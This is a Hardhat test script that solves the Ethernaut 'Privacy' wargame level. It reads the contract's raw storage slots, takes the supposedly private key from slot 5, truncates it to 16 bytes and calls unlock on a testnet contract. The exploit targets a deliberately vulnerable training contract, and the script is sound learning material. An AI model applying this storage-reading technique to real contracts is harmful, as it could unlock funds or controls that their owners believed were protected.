// npx hardhat test ./test/12_privacy.js --network rinkeby

const { expect } = require("chai");
const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");
const ETHERNAUT_LEVELS = require("../ethernaut-levels-config.js")
const Utils = require("./Utils.js");

let levelContract;
const INTERFACE_CONTRACT = "Privacy";

before(async () => {
    levelContract = await Utils.getLevelContract(ETHERNAUT_LEVELS._12_privacy, INTERFACE_CONTRACT);
});

it("solves the level", async function () {
    // https://github.com/MrToph/ethernaut/blob/master/test/12-privacy.ts
    // storage is allocated to slots like this:
    // https://docs.soliditylang.org/en/v0.6.8/internals/layout_in_storage.html
    // 0: locked
    // 1: ID
    // 2: flattening, denomination, awkwardness (storage can be packed into a 256 bit slot)
    // 3: data[0] (because **fixed** size array)
    // 4: data[1]
    // 5: data[2]    
    for (let i = 0; i < 7; i++) {
        let slotData = await ethers.provider.getStorageAt(levelContract.address, i);
        console.log(`slotData = ${i} "${BigNumber.from(slotData).toString()}"`);
    }
    let keyData = await ethers.provider.getStorageAt(levelContract.address, 5 /* data[2] */)
    // seems to take the most significant bits data[2][0..15] when doing bytes16(data[2])
    let key16 = `${keyData.slice(0, 34)}` // bytes16 = 16 bytes
    console.log(`BN key16 = "${BigNumber.from(key16).toString()}"`);
    console.log(`Buffer key16 = "${Buffer.from(key16, `hex`).toString(`utf8`)}"`)
    console.log(`key16 = "${key16}"`)
    tx = await levelContract.unlock(key16)
    await tx.wait()
    //console.log(tx);
});

after(async () => {
    expect(await Utils.submitLevel(levelContract.address), "level was not completed").to.be.true;
});